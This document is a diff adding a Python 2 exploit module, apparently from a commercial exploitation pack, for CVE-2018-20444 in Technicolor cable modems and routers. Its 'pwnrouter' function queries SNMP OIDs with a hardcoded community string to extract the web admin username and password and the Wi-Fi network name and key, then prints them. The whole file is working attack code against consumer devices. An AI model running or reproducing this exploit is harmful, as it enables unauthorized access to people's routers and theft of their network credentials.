@@ -1,0 +1,61 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import sys
+
+try:
+  from pysnmp.entity.rfc3413.oneliner import cmdgen
+except:
+  print '[D2] d2sec_technicolor_2.py: No module pysnmp'
+
+_name_   = 'd2sec_technicolor_2'
+_vendor_ = 'technicolor'
+_model_  = ['CGA0111', 'CWA0101', 'DPC3928SL', 'TC7110.AR', 'TC7110.B', 'TC7110.D', 'TC7200.d1I', 'TC7200.TH2v2']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2018-20444'
+_ref_    = 'https://misteralfa-hack.blogspot.com/2018/12/technicolor-passwords-wireless-via-snmp.html'
+_port_   = 161
+
+def pwnrouter(host):
+  res = {}
+  oids = {  
+    # make, model, software version
+    "MODEL": "1.3.6.1.2.1.1.1.0",
+    # web interface credentials
+    "WEB USERNAME": "1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0",
+    "WEB PASSWORD": "1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0",
+    # ssid and key
+    "ESSID": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.10001",
+    "PASSWORD": "1.3.6.1.4.1.4413.2.2.2.1.18.1.2.3.4.1.2.10001",
+  }    
+  generator = cmdgen.CommandGenerator()
+  for name in oids.keys():
+    errorIndication, errorStatus, errorIndex, varBinds = generator.getCmd(
+      cmdgen.CommunityData('d2'),
+      cmdgen.UdpTransportTarget((host, 161)),
+      oids[name], 
+      lookupNames=True, 
+      lookupValues=True 
+    )
+    if errorIndication or errorStatus:
+      res[name] = ''  
+      continue
+    value = str(varBinds[0][1])
+    res[name] = value
+  if res:
+    print '[+] %s vulnerable' % host
+    print('%s: %s\n%s: %s\n%s: %s\n%s: %s\n%s: %s\n'%('MODEL',res['MODEL'],'WEB USERNAME',res['WEB USERNAME'],'WEB PASSWORD',res['WEB PASSWORD'],'ESSID',res['ESSID'],'PASSWORD',res['PASSWORD'],))
+  else:
+    print '[-] %s not vulnerable' % host
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
